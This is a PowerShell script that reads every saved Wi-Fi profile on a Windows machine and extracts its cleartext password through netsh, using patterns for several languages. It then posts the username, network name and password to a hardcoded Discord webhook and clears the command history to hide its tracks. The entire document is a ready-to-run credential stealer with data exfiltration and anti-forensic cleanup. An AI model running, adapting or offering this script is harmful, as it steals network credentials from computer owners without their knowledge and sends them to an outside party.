# 1. YOU MUST REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
$discord = "https://discord.com/api/webhooks/1508073827593097316/qE831FTLcohu8WMpIv4lQUme7hmkNdBh-YEftwk_FENvMHQpmuPatTQFFqaU1NxS0J4Y"

# Fetch Wi-Fi profiles using a language-agnostic method
$profiles = netsh wlan show profiles | Select-String ':(.+)$' | ForEach-Object { $_.Matches.Value.Trim(': ') }

foreach ($wlan in $profiles) {
    # Skip empty lines or headers
    if (-not $wlan) { continue }

    # Fetch the password line using a language-agnostic regex (captures whatever comes after the last colon)
    $passw = netsh wlan show profile name="$wlan" key=clear | 
             Select-String '(Key Content|Contenido de la clave|Schlüsselinhalt|Contenu de la clé).+:\s(.+)'

    # If the language wasn't caught above, fall back to grabbing the last part of the password block safely
    if (-not $passw) {
        # Alternative fallback: grab the content after the colon on the specific line index if needed, 
        # but the English/Regex approach below handles English natively:
        $passw = netsh wlan show profile name="$wlan" key=clear | Select-String '(?<=:\s).+' | Select-Object -Index 8
    } else {
        $passw = $passw.Matches.Groups[2].Value
    }

    # Construct the payload
    $Body = @{
        'username' = "$env:username | $wlan"
        'content'  = [string]$passw
    }
    
    # Send to Discord
    try {
        Invoke-RestMethod -ContentType 'application/json' -Uri $discord -Method Post -Body ($Body | ConvertTo-Json)
    } catch {
        Write-Warning "Failed to send data for $wlan"
    }
}

# Clear the PowerShell command history
Clear-History
